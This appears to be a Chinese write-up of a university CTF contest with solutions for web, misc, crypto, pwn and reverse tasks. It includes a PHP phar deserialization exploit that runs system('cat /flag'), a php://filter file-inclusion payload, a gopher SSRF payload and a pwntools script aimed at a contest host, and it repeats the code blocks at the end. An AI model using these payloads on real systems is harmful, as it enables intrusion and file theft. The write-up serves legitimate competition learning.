# 第三届广东省大学生网络攻防竞赛WriteUp

> 原文: https://www.ctfiot.com/181138.html
> ID: 181138

WEB

消失的flag

题目描述：

flag就隐藏再某个文件里面，看看能不能包含出来 。

加个XFF，构造文件包含读取flag

/?file=php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag

unserialize_web

题目描述：

同事给我了一个反序列话的源码，在线求助 ！

题目给了一个文件上传的功能点

进行目录扫描,可以发现一个www.tar.gz的备份文件，代码审计分析

构造payload生成一个exp.phar

<?php
//spring
class File {
    public $val1;
    public $val2;
    public $val3;
    public function __construct(){
        $this->val1 = 'file';
        $this->val2 = 'exists';
        $this->val3 = "system('cat /flag');";
    }
}

$a = new File();
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($a);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

弄好后，写一个脚本进行改签名上传上去进行phar文件包含即可，原题改的

import gzip
import hashlib
with open("exp.phar",'rb') as f:
    f = f.read()
s = f[:-28]
s = s.replace(b'3:{', b'4:{')
h = f[-8:]
newf = s + hashlib.sha1(s).digest() + h
print(newf)
newf = gzip.compress(newf)
with open('res.png','wb') as f2:
    f2.write(newf)

构造数据包成功读取flag

cac913f741c74cffbdfbcc3c76673631

mypdf

首先注册一个账号，构造数据包如下

需要满足invite置为-3.3e99999999999999即可绕过,这里绕过的原理是两种json格式导致请求错误从而绕过,成功注册了用户

进行登录后台

在title插入如下poc,这里题目不出网，注意Content-Type值需要对应修改，这里长度为18

<linktype="text/css"href="gopher://127.0.0.1:
8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2018%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22test456%22%7D">

点击功能点进行下载.

注意这里要用wps软件打开，抓包需要保留cookie。

修改action访问admin触发，这时已经通过gopher协议打ssrf成功访问内网/users接口，读取flag

50e4f69c8d24499a9dc070a22e8086fc

参考：https://r0.haxors.org/posts?id=15

MISC

猜一猜

下载一个压缩包要密码，密码为压缩包名字md5解密值

解密得到一个打不开的图片，winhex打开发现图片头需要修复

改好打开是一个二维码，扫描为花朵解密得到flag

你要的就在这

打开一张图片，公式计算为Π

下面这个6看的不明所以

图片尾提示 stegpy

解密时发现是脑洞，为取 Π的 六位数字即 3.1415

然后k:
luckyone  是key

前面进行进制转换

然后 des CBC解密得到 flag，因为幸运 1 所以vi用 1，然后就是猜单词，看得出为 believe

Flag{believe_you_are_lucky}

CRYPTO

encipher

给了私钥，直接解RSA，然后异或即可。

from Crypto.Util.number import *
from Crypto.Util.strxor import strxor

c = 67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451
d = 4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233
n = 89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487

msg = "This is a secret message"
msg = msg.encode()
msg_length = len(msg)
key = b'Life is like an ocean only strong-minded can reach the other shore'
key = key[:
msg_length]

xor_m = pow(c,d,n)
print(strxor(long_to_bytes(xor_m), key))

# flag{1s_Pa33w0rd_1y2u22}

PWN

pwn_server

代码审计

这里会把我们输入的进行异或操作

这个就是漏洞所在 这里是用-1进行起算的

思路

我们通过输入ascii码为0x30的字符（就是0），然后进行操作，绕过限制，然后在这里会进行复制的操作

然后会把我们最上面的s的flag值，覆盖到file变量上

exp

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    p = process(name)
    #p = remote("")
    elf = ELF(name)
# get_p("./server")
# sh = remote("127.0.0.1",10888)
sh = remote("fb7e5e8b-3884-e761-f3bf-9d413da0489a11cf.tq.jxsec.cn",30638)
# gdb.attach(p,"b *0x000400D6B")
# sleep(2)
    
sh.send("0:
0x00")
sh.interactive()

# p.interactive()

RE

ctf-2

无壳，代码都在main函数。可以看到校验分成两轮。

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // esi
  _BYTE *v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int i; // esi
  unsigned int v16; // ecx
  unsigned int j; // edx
  unsigned int v18; // ecx
  unsigned int v19; // ecx
  unsigned int v20; // ecx
  char v21; // al
  unsigned int v23; // [esp+Ch] [ebp-34h] BYREF
  __int128 v24; // [esp+10h] [ebp-30h]
  unsigned int v25; // [esp+20h] [ebp-20h]
  int v26; // [esp+34h] [ebp-Ch] BYREF
  char v27; // [esp+38h] [ebp-8h]

  v26 = 0;
  v27 = 0;
  v4 = sub_2F2550(v3);
  sub_2F2830(v4);
  do
  {
    v6 = 0;                                     // 轮数
    do
    {
      sub_2F2550(v5);
      v23 = 0;
      sub_2F28D0(&v23);                         // 获取输入
      v7 = (char *)&v26 + v6++;                 // 轮数和前一次的结果合并
      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&v26) + (_BYTE)v7) & 3);// 第一次是0;第二次是0x10;第三次0x18
      v23 = (unsigned __int8)(v23 >> v5);
      *v7 = byte_320DE0[v23];
    }
    while ( v6 < 5 );
    v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) >> 8);
    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 >> 8);
    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 >> 8);
    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 >> 8));
  }
  while ( v5 != 0x27949C6C );
  v11 = sub_2F2550(0x27949C6C);
  sub_2F2830(v11);
  v25 = 0;
  v24 = 0i64;
  v13 = sub_2F2550(v12);
  sub_2F2830(v13);
  for ( i = 0; i < 5; ++i )
  {
    sub_2F2550(v14);
    v23 = 0;
    sub_2F28D0(&v23);
    *((_DWORD *)&v24 + i) = v23;
  }
  if ( (unsigned int)v24 <= 0xF )
    byte_324AD8[v24] = v26;
  if ( DWORD1(v24) <= 0xF )
    byte_324AD8[DWORD1(v24)] = BYTE1(v26);
  if ( DWORD2(v24) <= 0xF )
    byte_324AD8[DWORD2(v24)] = BYTE2(v26);
  if ( HIDWORD(v24) <= 0xF )
    byte_324AD8[HIDWORD(v24)] = HIBYTE(v26);
  if ( v25 <= 0xF )
    byte_324AD8[v25] = v27;
  v16 = -1;
  for ( j = 0; j < 0x10; j += 4 )
  {
    v18 = dword_320EE0[(unsigned __int8)(v16 ^ byte_324AD8[j])] ^ (v16 >> 8);
    v19 = dword_320EE0[(unsigned __int8)(v18 ^ byte_324AD9[j])] ^ (v18 >> 8);
    v20 = dword_320EE0[(unsigned __int8)(v19 ^ byte_324ADA[j])] ^ (v19 >> 8);
    v21 = byte_324ADB[j];
    v16 = dword_320EE0[(unsigned __int8)(v20 ^ v21)] ^ (v20 >> 8);
  }
  if ( ~v16 == 0x7F5E79B7 )
  {
    sub_2F1170("you win: please the key decrypt flag.rn");
    sub_2F1170("flag:
uQBF11zD6uYP9kJhRhL8OeesPaaZQQvbl3wx7Ik0T6g=. alg=AESrn");
  }
  return 0;
}

Round1

接收5次用户输入，通过如下代码进行位置映射。

do
    {
      sub_2F2550(v5);
      v23 = 0;
      sub_2F28D0(&v23);                         // 获取输入
      v7 = (char *)&v26 + v6++;                 // 轮数和前一次的结果合并
      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&v26) + (_BYTE)v7) & 3);// 第一次是0;第二次是0x10;第三次0x18
      v23 = (unsigned __int8)(v23 >> v5);
      *v7 = byte_320DE0[v23];
    }
while ( v6 < 5 );

映射后的五个字符进行CRC32加密，并且只有前五个输入校验后结果=0x27949C6C程序才会往下运行。

    v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) >> 8);
    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 >> 8);
    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 >> 8);
    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 >> 8));
while ( v5 != 0x27949C6C );

直接写脚本进行爆破

int main( void )
{
 unsigned v8, v9, v10, v5;
 for ( int i = 0; i < 256; i++ )
 {
  for ( int j = 0; j < 256; j++ )
  {
   for ( int k = 0; k < 256; k++ )
   {
    for ( int l = 0; l < 256; l++ )
    {
     for ( int m = 0; m < 256; m++ )
     {
      /* i = 0x57, j = 0x65, k = 0xa6, l = 0x3d, m = 0xe5; */
      v8 = crc32_table[(unsigned char)(~((unsigned char)crc32_table[(unsigned char)~i]) ^ j)] ^ ((crc32_table[(unsigned char)~i] ^ 0xFFFFFF) >> 8);
      v9 = crc32_table[(unsigned char)(v8 ^ k)] ^ (v8 >> 8);
      v10 = crc32_table[(unsigned char)(v9 ^ l)] ^ (v9 >> 8);
      v5 = ~(crc32_table[(unsigned char)(v10 ^ m)] ^ (v10 >> 8));
      // printf("%xn", v5);
      if ( v5 == 0x27949C6C )
      {
       printf( "%d %d %d %d %dn", i, j, k, l, m );
       unsigned char x[] = { i, j, k, l, m };
       // start_rand2( x );
      }
     }
    }
   }
  }
 }
    return(0);
}

Round2

依旧是直接爆破，检测代码如下：

爆破脚本，和结果

#include <stdio.h>

const unsigned long crc32_table[258]={
     0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
                0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D, 0x7F5E79B7, 0x00000000
};

void start_rand2( unsigned char x[] )
{
 unsigned int v18, v19, v20, v16;
 for ( int i = 0; i < 16; i++ )
 {
  for ( int j = 0; j < 16; j++ )
  {
   for ( int k = 0; k < 16; k++ )
   {
    for ( int l = 0; l < 16; l++ )
    {
     for ( int m = 0; m < 16; m++ )
     {
      unsigned char key[] = { 0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB };
      key[i] = x[0];
      key[j] = x[1];
      key[k] = x[2];
      key[l] = x[3];
      key[m] = x[4];
      v16 = 0xffffffff;
      for ( int cnt = 0; cnt < 0x10; cnt += 4 )
      {
       v18 = crc32_table[(unsigned char) (v16 ^ key[cnt])] ^ (v16>> 8);
       v19 = crc32_table[(unsigned char) (v18 ^ key[cnt + 1])] ^ (v18 >> 8);
       v20 = crc32_table[(unsigned char) (v19 ^ key[cnt + 2])] ^ (v19 >> 8);
       v16 = crc32_table[(unsigned char) (v20 ^ key[cnt + 3])] ^ (v20 >> 8);
      }
      if ( ~v16 == 0x7F5E79B7 )
      {
       printf( "found: %d %d %d %d %dn", i, j, k, l, m );
      }
     }
    }
   }
  }
 }
}

int main( void )
{
 unsigned char x[] = { 237, 247, 252, 137, 206 };
 start_rand2(x);
 return(0);
}

Get Key

根据最后的提示，我们可以得到key。密钥是16字节，这正好对应第二轮的crc32明文byte_A44AD8

key = [0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB]
index = [2, 9, 10, 14, 5]
data = [237, 247, 252, 137, 206]

for i in range(5):
    key[index[i]] = data[i]

for i in range(16):
    print(format(key[i], '02x'), end='')

# 1bb1edfd19ce898c09f7fcd74ab389eb

Get Flag

flag:&n&8qoqdeeuysq7U


```
<?php
//spring
class File {
    public $val1;
    public $val2;
    public $val3;
    public function __construct(){
        $this->val1 = 'file';
        $this->val2 = 'exists';
        $this->val3 = "system('cat /flag');";
    }
}

$a = new File();
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ? >');
$phar->setMetadata($a);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
import gzip
import hashlib
with open("exp.phar",'rb') as f:
    f = f.read()
s = f[:-28]
s = s.replace(b'3:{', b'4:{')
h = f[-8:]
newf = s + hashlib.sha1(s).digest() + h
print(newf)
newf = gzip.compress(newf)
with open('res.png','wb') as f2:
    f2.write(newf)
<linktype="text/css"href="gopher://127.0.0.1:
8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2018%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22test456%22%7D">
from Crypto.Util.number import *
from Crypto.Util.strxor import strxor

c = 67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451
d = 4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233
n = 89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487

msg = "This is a secret message"
msg = msg.encode()
msg_length = len(msg)
key = b'Life is like an ocean only strong-minded can reach the other shore'
key = key[:
msg_length]

xor_m = pow(c,d,n)
print(strxor(long_to_bytes(xor_m), key))

# flag{1s_Pa33w0rd_1y2u22}
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
    #libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    p = process(name)
    #p = remote("")
    elf = ELF(name)
# get_p("./server")
# sh = remote("127.0.0.1",10888)
sh = remote("fb7e5e8b-3884-e761-f3bf-9d413da0489a11cf.tq.jxsec.cn",30638)
# gdb.attach(p,"b *0x000400D6B")
# sleep(2)
    
sh.send("0:
0x00")
sh.interactive()

# p.interactive()
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // esi
  _BYTE *v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int i; // esi
  unsigned int v16; // ecx
  unsigned int j; // edx
  unsigned int v18; // ecx
  unsigned int v19; // ecx
  unsigned int v20; // ecx
  char v21; // al
  unsigned int v23; // [esp+Ch] [ebp-34h] BYREF
  __int128 v24; // [esp+10h] [ebp-30h]
  unsigned int v25; // [esp+20h] [ebp-20h]
  int v26; // [esp+34h] [ebp-Ch] BYREF
  char v27; // [esp+38h] [ebp-8h]

  v26 = 0;
  v27 = 0;
  v4 = sub_2F2550(v3);
  sub_2F2830(v4);
  do
  {
    v6 = 0;                                     // 轮数
    do
    {
      sub_2F2550(v5);
      v23 = 0;
      sub_2F28D0(&v23);                         // 获取输入
      v7 = (char *)&v26 + v6++;                 // 轮数和前一次的结果合并
      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&v26) + (_BYTE)v7) & 3);// 第一次是0;第二次是0x10;第三次0x18
      v23 = (unsigned __int8)(v23 >> v5);
      *v7 = byte_320DE0[v23];
    }
    while ( v6 < 5 );
    v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) >> 8);
    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 >> 8);
    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 >> 8);
    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 >> 8));
  }
  while ( v5 != 0x27949C6C );
  v11 = sub_2F2550(0x27949C6C);
  sub_2F2830(v11);
  v25 = 0;
  v24 = 0i64;
  v13 = sub_2F2550(v12);
  sub_2F2830(v13);
  for ( i = 0; i < 5; ++i )
  {
    sub_2F2550(v14);
    v23 = 0;
    sub_2F28D0(&v23);
    *((_DWORD *)&v24 + i) = v23;
  }
  if ( (unsigned int)v24 <= 0xF )
    byte_324AD8[v24] = v26;
  if ( DWORD1(v24) <= 0xF )
    byte_324AD8[DWORD1(v24)] = BYTE1(v26);
  if ( DWORD2(v24) <= 0xF )
    byte_324AD8[DWORD2(v24)] = BYTE2(v26);
  if ( HIDWORD(v24) <= 0xF )
    byte_324AD8[HIDWORD(v24)] = HIBYTE(v26);
  if ( v25 <= 0xF )
    byte_324AD8[v25] = v27;
  v16 = -1;
  for ( j = 0; j < 0x10; j += 4 )
  {
    v18 = dword_320EE0[(unsigned __int8)(v16 ^ byte_324AD8[j])] ^ (v16 >> 8);
    v19 = dword_320EE0[(unsigned __int8)(v18 ^ byte_324AD9[j])] ^ (v18 >> 8);
    v20 = dword_320EE0[(unsigned __int8)(v19 ^ byte_324ADA[j])] ^ (v19 >> 8);
    v21 = byte_324ADB[j];
    v16 = dword_320EE0[(unsigned __int8)(v20 ^ v21)] ^ (v20 >> 8);
  }
  if ( ~v16 == 0x7F5E79B7 )
  {
    sub_2F1170("you win: please the key decrypt flag.rn");
    sub_2F1170("flag:
uQBF11zD6uYP9kJhRhL8OeesPaaZQQvbl3wx7Ik0T6g=. alg=AESrn");
  }
  return 0;
}
do
    {
      sub_2F2550(v5);
      v23 = 0;
      sub_2F28D0(&v23);                         // 获取输入
      v7 = (char *)&v26 + v6++;                 // 轮数和前一次的结果合并
      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&v26) + (_BYTE)v7) & 3);// 第一次是0;第二次是0x10;第三次0x18
      v23 = (unsigned __int8)(v23 >> v5);
      *v7 = byte_320DE0[v23];
    }
while ( v6 < 5 );
v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) >> 8);
    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 >> 8);
    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 >> 8);
    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 >> 8));
while ( v5 != 0x27949C6C );
int main( void )
{
 unsigned v8, v9, v10, v5;
 for ( int i = 0; i < 256; i++ )
 {
  for ( int j = 0; j < 256; j++ )
  {
   for ( int k = 0; k < 256; k++ )
   {
    for ( int l = 0; l < 256; l++ )
    {
     for ( int m = 0; m < 256; m++ )
     {
      /* i = 0x57, j = 0x65, k = 0xa6, l = 0x3d, m = 0xe5; */
      v8 = crc32_table[(unsigned char)(~((unsigned char)crc32_table[(unsigned char)~i]) ^ j)] ^ ((crc32_table[(unsigned char)~i] ^ 0xFFFFFF) >> 8);
      v9 = crc32_table[(unsigned char)(v8 ^ k)] ^ (v8 >> 8);
      v10 = crc32_table[(unsigned char)(v9 ^ l)] ^ (v9 >> 8);
      v5 = ~(crc32_table[(unsigned char)(v10 ^ m)] ^ (v10 >> 8));
      // printf("%xn", v5);
      if ( v5 == 0x27949C6C )
      {
       printf( "%d %d %d %d %dn", i, j, k, l, m );
       unsigned char x[] = { i, j, k, l, m };
       // start_rand2( x );
      }
     }
    }
   }
  }
 }
    return(0);
}
    #include <stdio.h>

const unsigned long crc32_table[258]={
     0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
                0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 